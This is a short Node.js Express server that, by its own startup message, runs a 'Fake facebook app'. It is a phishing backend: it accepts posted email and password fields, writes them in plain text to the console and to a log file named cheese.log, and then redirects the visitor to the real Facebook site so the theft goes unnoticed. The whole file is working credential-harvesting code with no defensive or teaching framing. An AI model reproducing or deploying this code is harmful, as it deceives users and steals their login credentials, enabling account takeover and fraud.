const express = require('express')
const app = express()
const port = 80
const bodyParser = require('body-parser')
const log4js = require("log4js");
log4js.configure({
  appenders: { cheese: { type: "file", filename: "cheese.log" } },
  categories: { default: { appenders: ["cheese"], level: "info" } }
});
 
const logger = log4js.getLogger("cheese");

app.use( bodyParser.json() );       // to support JSON-encoded bodies
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
  extended: true
})); 
app.use(express.static('public'))
app.post('/', function (req, res) {
    let body = req.body;
    let email = body.email;
    let password = body.password;
    console.log("email:",  email);
    console.log("password:",  password);
    logger.info("email:",  email);
    logger.info("password:",  password);
    res.redirect("https://www.facebook.com/")
  })

app.listen(port, () => console.log(`Fake facebook app listening at http://localhost:${port}`))